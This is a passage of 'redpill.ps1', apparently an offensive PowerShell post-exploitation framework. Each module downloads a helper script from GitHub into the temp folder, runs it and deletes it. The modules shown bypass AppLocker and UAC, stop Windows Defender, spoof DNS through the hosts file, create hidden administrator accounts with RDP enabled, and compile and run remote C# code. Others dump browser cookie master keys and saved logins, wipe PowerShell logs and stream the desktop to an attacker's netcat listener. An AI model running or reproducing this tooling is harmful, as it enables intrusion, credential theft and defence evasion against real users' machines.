      FolderPath        : C:\WINDOWS\tracing
      FileSystemRights  : Write
      IdentityReference : BUILTIN\Utilizadores

      VulnId            : 2::ACL (Mitre T1222)
      FolderPath        : C:\WINDOWS\System32\Microsoft\Crypto\RSA\MachineKeys
      FileSystemRights  : Write
      IdentityReference : BUILTIN\Utilizadores
   #>

   If($AppLocker -ieq "TestXml" -or $AppLocker -ieq "XmlBypass"){

      If(-not(Test-Path -Path "$Env:TMP\AppLockerXml.ps1")){## Download AppLockerXml.ps1 from my GitHub repository
         iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/AppLockerXml.ps1" -OutFile "$Env:TMP\AppLockerXml.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
      }

   }Else{

      ## Download AppLocker.ps1 from my GitHub
      If(-not(Test-Path -Path "$Env:TMP\AppLocker.ps1")){## Download AppLocker.ps1 from my GitHub repository
         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
         ## Check downloaded file integrity => FileSizeKBytes
         $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
         If($SizeDump -lt 23){## Corrupted download detected => DefaultFileSize: 23,486328125/KB
            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
            If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
            Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
         }   
      }

   }

   ## Run auxiliary module
   If($AppLocker -ieq "WhoAmi"){
       powershell -File "$Env:TMP\AppLocker.ps1" -WhoAmi Groups
   }ElseIf($AppLocker -ieq "Enum"){

       If($StartDir -ne "$Env:USERPROFILE"){
          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$StartDir" -Verb $Verb
       }Else{
          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$Env:WINDIR" -Verb $Verb
       }

   }ElseIf($AppLocker -ieq "XmlBypass"){
       powershell -File "$Env:TMP\AppLockerXml.ps1" -Action XmlBypass -Execute "$Execute" -TimeOpen $TimeOpen -Verb $Verb
   }ElseIf($AppLocker -ieq "TestBat"){
       powershell -File "$Env:TMP\AppLocker.ps1" -TestBat Bypass
   }ElseIf($AppLocker -Match '(.bat)$'){
       powershell -File "$Env:TMP\AppLocker.ps1" -TestBat "$AppLocker"
   }ElseIf($AppLocker -iNotMatch '(.bat)$'){
      Write-Host "";## Make sure user have imput an batch script!
      Write-Host "[error] This function only accepts Batch (bat) scripts!" -ForegroundColor Red -BackgroundColor Black
      Write-Host ""
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
   If(Test-Path -Path "$Env:TMP\AppLockerXml.ps1"){Remove-Item -Path "$Env:TMP\AppLockerXml.ps1" -Force}
}

If($DnsSpoof -ne "false"){

   <#
   .SYNOPSIS
      Redirect Domain Names to our Phishing IP address (dns spoof)
   
   .DESCRIPTION
      Remark: This module its [ deprecated ]
      Redirect Domain Names to our Phishing IP address

   .NOTES
      Required Dependencies: Administrator privileges on shell
      Remark: This will never work if the server uses CDN or virtual
      hosts. This only applies on servers with dedicated IPs.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DnsSpoof Enum
      Display hosts file content (dns resolver)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DnsSpoof Redirect -Domain "www.facebook.com" -ToIPaddr "192.168.1.72"
      Backup original hosts file and redirect Domain Name www.facebook.com To IPaddress 192.168.1.72

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DnsSpoof Clear
      Revert hosts file to is original state before DnSpoof changes.

   .OUTPUTS
      Redirecting Domains Using hosts File (Dns Spoofing)
      Clean dns cache before adding entry to hosts file.
      Redirect Domain: www.facebook.com TO IPADDR: 192.168.1.72

      # This file contains the mappings of IP addresses to host names. Each
      # entry should be kept on an individual line. The IP address should
      # be placed in the first column followed by the corresponding host name.
      # The IP address and the host name should be separated by at least one
      # space.
      #
      # Additionally, comments (such as these) may be inserted on individual
      # lines or following the machine name denoted by a '#' symbol.
      #
      # For example:
      #
      #      102.54.94.97     rhino.acme.com          # source server
      #       38.25.63.10     x.acme.com              # x client host
      # localhost name resolution is handled within DNS itself.
      #	127.0.0.1       localhost
      #	::1             localhost
      192.168.1.72 www.facebook.com
   #>

   ## Download DnsSpoof.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\DnsSpoof.ps1")){## Download DnsSpoof.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DnsSpoof.ps1 -Destination $Env:TMP\DnsSpoof.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\DnsSpoof.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,0283203125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\DnsSpoof.ps1"){Remove-Item -Path "$Env:TMP\DnsSpoof.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($DnsSpoof -ieq "Enum"){

       powershell -File "$Env:TMP\DnsSpoof.ps1" -DnsSpoof Enum

   }ElseIf($DnsSpoof -ieq "Redirect"){

       ## Make sure mandatory parameters are set
       If($Domain -ieq "false"){## www.facebook.com
           $Domain = "www.fac" + "ebook" + ".com" -join ''
       }
       If($ToIPaddr -ieq "false"){## www.google.pt
           $ToIPaddr = "216.58" + ".21" + "5.131" -join ''
       }

       ## Execute auxiliary module
       powershell -File "$Env:TMP\DnsSpoof.ps1" -DnsSpoof Redirect -Domain "$Domain" -ToIPaddr "$ToIPaddr"

   }ElseIf($DnsSpoof -ieq "Clear"){

       powershell -File "$Env:TMP\DnsSpoof.ps1" -DnsSpoof Clear

   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\DnsSpoof.ps1"){Remove-Item -Path "$Env:TMP\DnsSpoof.ps1" -Force}
}

If($DisableAV -ne "false"){

   <#
   .SYNOPSIS
      Author: @Sordum (RedTeam) | @r00t-3xp10it
      Disable Windows Defender Service (WinDefend) 

   .DESCRIPTION
      This CmdLet Query, Stops, Start Anti-Virus Windows Defender
      service without the need to restart or refresh target machine.

   .NOTES
      This cmdlet uses UacMe.ps1 to Escalate shell privileges to admin!

   .Parameter DisableAV
      Accepts arguments: Query, Stop and Start (default: Query)

   .Parameter ServiceName
      Windows Defender Service Name (default: WinDefend)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DisableAV Query
      Querys the Windows Defender Service State

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DisableAV Start
      Starts the Windows Defender Service (WinDefend)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -DisableAV Stop
      Stops the Windows Defender Service (WinDefend)

   .OUTPUTS
      Disable Windows Defender Service
      --------------------------------
      ServiceName      : WinDefend
      AMRversion       : 4.18.2104.14
      StartType        : Automatic
      CurrentStatus    : Running
      CanStop          : True
   #>

   ## Download DisableDefender.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\DisableDefender.ps1")){## Download DisableDefender.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DisableDefender.ps1 -Destination $Env:TMP\DisableDefender.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\DisableDefender.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 14){## Corrupted download detected => DefaultFileSize: 14,7080078125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($Delay -lt 4 -or $Delay -gt 10){$Delay = "4"}
   powershell -File "$Env:TMP\DisableDefender.ps1" -Action $DisableAV -ServiceName "$ServiceName" -Delay "$Delay"

   ## Clean Artifacts left behind
   If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
}



If($HiddenUser -ne "false"){

   <#
   .SYNOPSIS
      Query \ Create \ Delete Hidden User Accounts 

   .DESCRIPTION
      This CmdLet Querys, Creates or Deletes windows hidden accounts.
      It also allow users to set the account 'Visible' or 'Hidden' state.

   .NOTES
      Required Dependencies: Administrator Privileges on shell
      Mandatory requirements to {Create|Delete} or set account {Visible|Hidden} state
      The new created user account will be added to 'administrators' Group Name
      And desktop will allow multiple RDP connections if set -EnableRDP [ True ]

   .Parameter HiddenUser
      Accepts arguments: Query, Create, Delete, Visible, Hidden

   .Parameter UserName
      Accepts the User Account Name (default: SSAredTeam)

   .Parameter Password
      Accepts the User Account Password (default: mys3cr3tp4ss)

   .Parameter EnableRDP
      Accepts arguments: True and False (default: False)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Query
      Enumerate ALL Account's present in local system

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "SSAredTeam"
      Creates 'SSAredTeam' hidden account without password access and 'Adminitrator' privs

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss"
      Creates 'SSAredTeam' hidden account with password 'mys3cr3tp4ss' and 'Adminitrator' privs

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss" -EnableRDP True
      Create 'SSAredTeam' Hidden User Account with 'mys3cr3tp4ss' login password and enables multiple RDP connections.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Visible -UserName "SSAredTeam"
      Makes 'SSAredTeam' User Account visible on logon screen

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Hidden -UserName "SSAredTeam"
      Makes 'SSAredTeam' User Account Hidden on logon screen (default)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -HiddenUser Delete -UserName "SSAredTeam"
      Deletes 'SSAredTeam' hidden account

   .OUTPUTS
      Enabled Name               LastLogon           PasswordLastSet     PasswordRequired
      ------- ----               ---------           ---------------     ----------------
      False   Administrador                                                          True
      False   Convidado                                                             False
      False   DefaultAccount                                                        False
       True   pedro              20/03/2021 01:50:09 01/03/2021 19:53:46             True
      False   WDAGUtilityAccount                     01/03/2021 18:58:42             True

   #>

   ## Download HiddenUser.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\HiddenUser.ps1")){## Download HiddenUser.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1 -Destination $Env:TMP\HiddenUser.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\HiddenUser.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 17){## Corrupted download detected => DefaultFileSize: 17,3388671875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\HiddenUser.ps1"){Remove-Item -Path "$Env:TMP\HiddenUser.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($HiddenUser -ieq "Query"){## Query ALL user account's

      If(-not($UserName) -or $UserName -ieq "false"){

         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Query

      }Else{## Query Sellected user account

         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Query -UserName "$UserName"

      }

   }ElseIf($HiddenUser -ieq "verbose"){

      If(-not($UserName) -or $UserName -ieq "false"){

         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Verbose

      }Else{## Query Sellected user account

         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Verbose -UserName "$UserName"

      }

   }ElseIf($HiddenUser -ieq "Create"){

      If(-not($Password) -or $Password -ieq "false"){

         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Create -UserName "$UserName" -EnableRDP $EnableRDP

      }Else{

         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Create -UserName "$UserName" -Password "$Password" -EnableRDP $EnableRDP

      }

   }ElseIf($HiddenUser -ieq "Delete"){

      powershell -File "$Env:TMP\HiddenUser.ps1" -Action Delete -UserName "$UserName"

   }ElseIf($HiddenUser -ieq "Visible"){

      powershell -File "$Env:TMP\HiddenUser.ps1" -Action Visible -UserName "$UserName"

   }ElseIf($HiddenUser -ieq "Hidden"){

      powershell -File "$Env:TMP\HiddenUser.ps1" -Action HIdden -UserName "$UserName"

   }

   ## Clean Artifacts left behind
   If(Test-Path -Path "$Env:TMP\HiddenUser.ps1"){Remove-Item -Path "$Env:TMP\HiddenUser.ps1" -Force}
}


If($CsOnTheFly -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Download\Compile\Execute CS scripts On-The-Fly!

   .DESCRIPTION
      This CmdLet downloads\compiles script.cs (To exe) and executes the binary.

   .NOTES
      Required dependencies: BitsTransfer {native}
      This CmdLet allows users to Download script.cs from user input -URI [ URL ]
      into -OutFile [ absoluct\path\filename.exe ] directory OR simple to compile
      an Local script.cs into a standalone executable before execute him.

   .Parameter CsOnTheFly
      Accepts arguments: Compile, Execute (default: Execute)

   .Parameter Uri
      Script.cs URL to be downloaded OR Local script.cs absoluct \ relative path

   .Parameter OutFile
      Standalone executable name plus is absoluct \ relative path

   .Parameter IconSet
      Accepts arguments: True or False (default: False)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute
      Create demo script.cs \ compile it to binary.exe and execute him!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute -IconSet True
      Create demonstration script.cs \ compile it to binary.exe add
      redpill icon to standalone executable compiled and execute him!
      Remark: Adding a icon to our executable migth trigger AV detection!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Compile -Uri "calc.cs" -OutFile "out.exe"
      Compiles Local -Uri [ calc.cs ] into an standalone executable (dont-execute-exe)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CsOnTheFly Execute -Uri "calc.cs" -OutFile "out.exe"
      Compiles Local -Uri [ calc.cs ] into an standalone executable and execute it.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -CsOnTheFly Execute -Uri "https://raw.github.com/../calc.cs" -OutFile "$Env:TMP\out.exe"
      Downloads -Uri [ URL ] compiles the cs script into an standalone executable and executes the resulting binary.
      Remark: Downloading script.CS from network (https://) will mandatory download it to %tmp% directory!

   .OUTPUTS
      Compiling SpawnPowershell.cs On-The-Fly!
      ----------------------------------------
      Microsoft.NET : 4.8.03752
      NETCompiler   : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
      Uri           : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/SpawnPowershell.cs
      OutFile       : C:\Users\pedro\AppData\Local\Temp\Installer.exe
      Action        : Execute
      ApplIcon?     : False
      Compiled?     : True

      Directory                         Name          CreationTime       
      ---------                         ----          ------------       
      C:\Users\pedro\AppData\Local\Temp Installer.exe 06/04/2021 15:55:40
   #>


   ## Download CsOnTheFly.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\CsOnTheFly.ps1")){## Download CsOnTheFly.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CsOnTheFly.ps1 -Destination $Env:TMP\CsOnTheFly.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\CsOnTheFly.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 20){## Corrupted download detected => DefaultFileSize: 20,78515625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\CsOnTheFly.ps1"){Remove-Item -Path "$Env:TMP\CsOnTheFly.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   powershell -File "$Env:TMP\CsOnTheFly.ps1" -Action $CsOnTheFly -Uri "$Uri" -OutFile "$OutFile" -IconSet "$IconSet"

   ## Clean Artifacts left behind
   If(Test-Path -Path "$Env:TMP\CsOnTheFly.ps1"){Remove-Item -Path "$Env:TMP\CsOnTheFly.ps1" -Force}
}



If($CookieHijack -ne "False"){

   <#
   .SYNOPSIS
      Edge|Chrome Cookie Hijacking tool!

   .DESCRIPTION
      To hijack session cookies we first need to dump browser Master Key and the Cookie File.
      The Cookie files (Databases) requires to be manually downloaded from target system and
      imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!

   .NOTES
      Required dependencies: Edge =< 6.1.1123.0 | Chrome =< 89.0.4389.82
      Remark: Cookies are no longer stored as individual files on recent browser versions!
      Remark: The Cookie files (Databases) found will be stored on target %tmp% directory!
      Remark: The Login Data File can be imported into ChloniumUI.exe { Database field }
      to decrypt chrome browser passwords in plain text using the 'export' button!

   .Parameter CookieHijack
      Accepts arguments: Dump, History OR 'Local State' File absoluct path!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CookieHijack Dump
      Dump Microsoft Edge and Google Chrome Master Keys and cookie files
   
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -CookieHijack History
      Enumerate Active Chrome|Edge typed url's history (url's) and
      Dump Microsoft Edge and Google Chrome Master Keys and cookie files 

   .EXAMPLE
      PS C:\> .\redpill.ps1 -CookieHijack "$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
      Dump Microsoft Edge Master Keys and cookie file

   .EXAMPLE
      PS C:\> .\redpill.ps1 -CookieHijack "$Env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
      Dump Google Chrome Master Keys and cookie file

   .OUTPUTS
      Cookie Hijacking!
      -----------------
      To hijack session cookies we first need to dump browser Master Key and Cookie Files.
      The Cookie files (Database) requires to be manually downloaded from target system and
      imported onto ChloniumUI.exe on attacker machine to hijack browser cookie session(s)!

      Brower     : MicrosoftEdge
      Version    : 6.1.1123.0
      MasterKey  : wtXx6sM1482OWfsMXon6Am4Hi01idvFNgog3jTCsyAA=
      Database   : C:\Users\pedro\AppData\Local\Temp\Edge_Cookies

      Brower     : Chrome
      Version    : 89.0.4389.82     
      MasterKey  : 3Cms3YxFXVyJRUbulYCnxqY2dO/jubDkYBQBoYIvqfc=
      Database   : C:\Users\pedro\AppData\Local\Temp\Chrome_Cookies
      LoginData  : C:\Users\pedro\AppData\Local\Temp\Chrome_Login_Data

      Execute in attacker machine
      ---------------------------
      iwr -Uri shorturl.at/jryEQ -OutFile ChloniumUI.exe;.\ChloniumUI.exe
   #>

   ## Download CookieHijack.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\CookieHijack.ps1")){## Download CookieHijack.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CookieHijack.ps1 -Destination $Env:TMP\CookieHijack.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\CookieHijack.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 19){## Corrupted download detected => DefaultFileSize: 19,8291015625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\CookieHijack.ps1"){Remove-Item -Path "$Env:TMP\CookieHijack.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($CookieHijack -ieq "Dump"){
      powershell -File "$Env:TMP\CookieHijack.ps1"
   }ElseIf($CookieHijack -ieq "History"){
      powershell -File "$Env:TMP\CookieHijack.ps1" -ListHistory True
   }ElseIf($CookieHijack -iMatch '(Local State)$'){
      powershell -File "$Env:TMP\CookieHijack.ps1" -LocalState "$CookieHijack"
   }

   ## Clean Artifacts left behind
   If(Test-Path -Path "$Env:TMP\CookieHijack.ps1"){Remove-Item -Path "$Env:TMP\CookieHijack.ps1" -Force}
}



If($UacMe -ne "false"){

   <#
   .SYNOPSIS
      UAC bypass|EOP by dll reflection! (cmstp.exe)

   .DESCRIPTION
      This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
      using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
      and elevate privileges { user -> admin } or to exec one command with admin privs!

   .NOTES
      If executed with administrator privileges and the 'Elevate' @argument its sellected,
      then this cmdlet will try to elevate the "cmdline" from admin => NT AUTHORITY\SYSTEM!

   .Parameter UacMe
      Accepts arguments: Bypass, Elevate, Clean

   .Parameter Execute
      Accepts the command OR application absoluct path to be executed!

   .Parameter Date
      Delete artifacts left behind by is 'CreationTime' (default: today)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -UacMe bypass -Execute "regedit.exe"
      Spawns regedit without uac asking for execution confirmation

   .EXAMPLE
      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "cmd.exe"
      Local spawns an cmd prompt with administrator privileges! 
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell.exe"
      Local spawns an powershell prompt with administrator privileges!   

   .EXAMPLE
      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell -file $Env:TMP\redpill.ps1"
      Executes redpill.ps1 script trougth uac bypass module with elevated shell privs {admin}
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell -file $Env:TMP\DisableDefender.ps1 -Action Stop"
      Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}

   .EXAMPLE
      PS C:\> .\redpill.ps1 -UacMe Clean
      Deletes uac bypass artifacts and powershell eventvwr logs!
      Remark: Admin privileges are required to delete PS logfiles.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -UacMe Clean -Date "19/04/2021"
      Clean ALL artifacts left behind by this cmdlet by is 'CreationTime'

   .OUTPUTS
      Payload file written to C:\Windows\Temp\455pj4k3.inf

      Privilege Name                Description                                   State
      ============================= ============================================= ========
      SeShutdownPrivilege           Encerrar o sistema                            Disabled
      SeChangeNotifyPrivilege       Ignorar verificação transversal               Enabled
      SeUndockPrivilege             Remover computador da estação de ancoragem    Disabled
      SeIncreaseWorkingSetPrivilege Aumentar um conjunto de trabalho de processos Disabled
      SeTimeZonePrivilege           Alterar o fuso horário                        Disabled

      UAC State     : Enabled
      UAC Settings  : Notify Me
      ReflectionDll : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
      Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\redpill.ps1
   #>

   ## Download UacMe.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1")){## Download UacMe.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1 -Destination $Env:TMP\UacMe.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 22){## Corrupted download detected => DefaultFileSize: 22,322265625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($UacMe -ieq "Bypass" -or $UacMe -ieq "Elevate"){
      powershell -File "$Env:TMP\UacMe.ps1" -Action "$UacMe" -Execute "$Execute"
   }ElseIf($UacMe -ieq "Clean"){
      powershell -File "$Env:TMP\UacMe.ps1" -Action "$UacMe" -Date "$Date"
   }

   ## Clean Artifacts left behind
   If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
}


If($GetSkype -ne "False"){

   <#
   .SYNOPSIS
      PowerShell functions for enumerating and attacking federated Skype

   .DESCRIPTION
         PowerShell functions for enumerating and attacking federated Skype for Business instances.

   .NOTES
      Mandatory requirements: Microsoft.Lync.Model 2013 SDK

   .Parameter GetSkype
      Accepts arguments: Contacts, DomainUsers (default: Contacts)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetSkype Contacts

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetSkype DomainUsers

   .OUTPUTS
      Email             Title              Full Name     Status    Out Of Office  Endpoints                                                                                   
      -----             -----              ---------     ------    -------------  ---------                                                                                   
      test@example.com  Person of Interest J Doe         Offline   False          Work: tel:911
   #>


   ## Download GetSkype.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetSkype.ps1")){## Download GetSkype.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSkype.ps1 -Destination $Env:TMP\GetSkype.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetSkype.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 22){## Corrupted download detected => DefaultFileSize: 22,322265625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetSkype.ps1"){Remove-Item -Path "$Env:TMP\GetSkype.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }


   ## Import auxiliary module
   Import-Module -Name "$Env:TMP\GetSkype.ps1" -EA SilentlyContinue -Force  ## <-- Import Module
   If($GetSkype -ieq "Contacts") ## <-- Sellect the type of scan
   {
      Get-SkypeContacts | Format-Table -AutoSize ## <-- Run Module
   }
   ElseIf($GetSkype -ieq "DomainUsers")
   {
      Get-SkypeDomainUsers | Format-Table -AutoSize ## <-- Run Module
   }

   ## Clean Artifacts left behind
   If(Test-Path -Path "$Env:TMP\GetSkype.ps1"){Remove-Item -Path "$Env:TMP\GetSkype.ps1" -Force}

}


If($LiveStream -ne "false"){

   <#
   .SYNOPSIS
      Author: @samratashok (nishang) | @r00t-3xp10it
      Helper - cmdlet for streaming a target's desktop using MJPEG.

   .DESCRIPTION
      This script uses MJPEG to stream a target's desktop in real time.
      A browser which supports MJPEG (Firefox) should then be pointed
      to the local port sellected by attacker to stream remote desktop.

   .NOTES
      Mandatory dependencies: A browser which supports MJPEG (Default: Firefox)
      If attacker sellected -Timmer '0' then stream will stay open until attacker
      manually stops it using this cmdlet -LiveStream 'Stop' argument, If another
      Timmer its sellected then this cmdlet will wait -Timmer 'seconds' to stop
      the streaming and delete ALL artifacts left behind by this function.

   .PARAMETER LiveStream
      Accepts arguments: Bind, Reverse, Stop (default: Bind)

   .Parameter IpAddress
      The IP address to connect to when using the -Reverse switch.

   .PARAMETER Port
      The port to connect to when using the -Reverse switch.
      When using -Bind it is the port on which this script listens.

   .PARAMETER Timmer
      The amount of time in seconds to stream (default: 15)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -LiveStream Bind
      Start target desktop live streammimg on port 1234 for 15 seconds!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 4321 -Timmer 20
      Start target desktop live streammimg on port 4321 for 20 seconds!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 1234 -Timmer 0
      Start target desktop live streammimg on port 1234 (but dont stop streaming)
      Remark: If -Timmer '0' its sellected then manual stream stop its required!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -LiveStream Reverse -IpAddress 192.168.1.71 -Port 1234
      Start target desktop live streammimg on port 1234 (port used by reverse tcp shell connection)
      Remark: The follow netcat syntax can be used on attacker machine [ nc -nlvp 1234 | nc -nlvp 9000 ]
      Remark: The follow powercat syntax can be used [ powercat -l -v -p 1234 -r tcp:9000 -rep -t 1000  ]

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -LiveStream Stop
      Stop target desktop live streammimg if sellected -Timmer '0' before!

   .OUTPUTS
      Stream desktop settings
      -----------------------
      Target   : 192.168.1.72
      Attacker : 192.168.1.73
      Stream   : Reverse
      BindPort : 1234
      Timmer   : 30 (sec)

      Creating trigger.ps1 to import \ run module on a diferent process! (child)
      Executing Start-Process to run module in a new powershell process! (child)
      -----------------------------------------------------------------------------
      Execute on attacker console: nc -nlvp 1234 | nc -nlvp 9000
